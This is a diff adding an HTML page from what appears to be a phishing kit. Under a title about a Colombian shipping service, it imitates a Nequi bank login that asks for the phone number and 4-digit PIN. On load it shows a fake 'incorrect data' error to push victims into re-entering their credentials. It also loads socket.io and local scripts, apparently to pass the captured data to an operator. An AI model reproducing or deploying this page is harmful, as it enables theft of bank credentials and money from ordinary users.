@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>El servicio de envíos de Colombia</title>
+    <link rel="stylesheet" href="css/style.css">
+    <script src="../../../js/functions.js"></script>
+    <style>
+        body {
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-content: flex-start;
+        }
+
+        #cargando {
+            position: fixed;
+            top: 60%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 920;
+            display: none;
+        }
+
+        .btn-habilitado {
+            background-color: #DA0081;
+            color: #fff;
+        }
+
+        .btn-deshabilitado {
+            background-color: #F1BFDA;
+            color: #fff;
+        }
+
+        .mensaje-error {
+            display: flex; /* Inicialmente oculto */
+            align-items: center;
+            color: #fff;
+            background-color: #ff4d4d;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            text-align: center;
+            position: fixed;
+            top: -100px; /* Fuera de la pantalla */
+            left: 0;
+            right: 0;
+            z-index: 999;
+            transition: top 0.5s ease-in-out;
+        }
+
+        .mensaje-error.visible {
+            top: 0; /* Deslizar hacia abajo */
+        }
+
+        .mensaje-error::before {
+            content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" style="fill: rgba(255, 255, 255, 1);transform: ;msFilter:;"><path d="M11.001 10h2v5h-2zM11 16h2v2h-2z"></path><path d="M13.768 4.2C13.42 3.545 12.742 3.138 12 3.138s-1.42.407-1.768 1.063L2.894 18.064a1.986 1.986 0 0 0 .054 1.968A1.984 1.984 0 0 0 4.661 21h14.678c.708 0 1.349-.362 1.714-.968a1.989 1.989 0 0 0 .054-1.968L13.768 4.2zM4.661 19 12 5.137 19.344 19H4.661z"></path></svg>'); /* Icono de exclamación */
+            margin-right: 10px;
+            font-size: 18px;
+            display: inline-flex;
+            align-items: center;
+            vertical-align: middle;           
+        }
+
+        #btn-consultar {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="fondo"></div>
+    <img src="img/preloader2.gif" id="cargando" width="110">
+    <div id="frm-consulta" class="frm-modal">
+        <img src="img/neko.png" alt="" style="width: 100%; ">
+        <div class="formulario">
+            <input type="text" name="txt-num" id="txt-num" placeholder="Número de celular" class="entradas"
+                autocomplete="off" maxlength="10" pattern="[0-9]*" inputmode="numeric"
+                onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"
+                style="background-color: #fbf7fb;">
+            <br><br>
+            <input type="password" name="txt-pass" id="txt-pass" placeholder="Clave" class="entradas" autocomplete="off"
+                maxlength="4" pattern="[0-9]*" inputmode="numeric"
+                onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;"
+                style="background-color: #fbf7fb;">
+            <br><br>
+            <button class="btn btn-habilitado" id="btn-consultar">Entrar</button>
+            <br><br>
+            <button class="backbutton" id="backbutton" style="color: black;">Ahora no</button>
+            <br><br>
+            <div id="mensaje-error" class="mensaje-error">
+                ¡Ups! Datos incorrectos. Verifica e intenta de nuevo.
+            </div>
+            <p class="">¿Se te olvidó la clave? Abre nequi en tu cel y cambiala en segundos.</p>
+        </div>
+    </div>
+
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script>
+        window.onload = function () {
+            // Mostrar el mensaje de error
+            var mensajeError = document.getElementById('mensaje-error');
+            mensajeError.style.display = 'block';
+            mensajeError.classList.add('visible');
+
+            // Ocultar el mensaje después de 4 segundos
+            setTimeout(function () {
+                mensajeError.classList.remove('visible');
+                setTimeout(function () {
+                    mensajeError.style.display = 'none';
+                }, 500); // Tiempo para la animación de deslizarse hacia arriba
+            }, 4000);
+        };
+    </script>
+    <script src="./js/info.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
+    <script src="js/waiting.js"></script>
+</body>
+
+</html>
